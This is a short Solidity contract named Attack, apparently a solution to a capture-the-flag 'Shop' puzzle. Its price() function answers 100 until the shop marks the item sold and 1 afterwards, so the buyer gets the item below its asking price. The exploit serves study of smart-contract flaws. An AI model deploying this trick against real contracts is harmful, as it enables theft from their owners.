// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Shop {
    function isSold() external view returns(bool);
    function buy() external;
}

contract Attack{
    address public target;

    constructor(address _target){
        target = _target;
        
    }

    function price() public view returns (uint256){
        if(Shop(target).isSold() == false){
            return 100;
        }
        return 1;
    }

    function attack() public {
        Shop(target).buy();
    }
    
}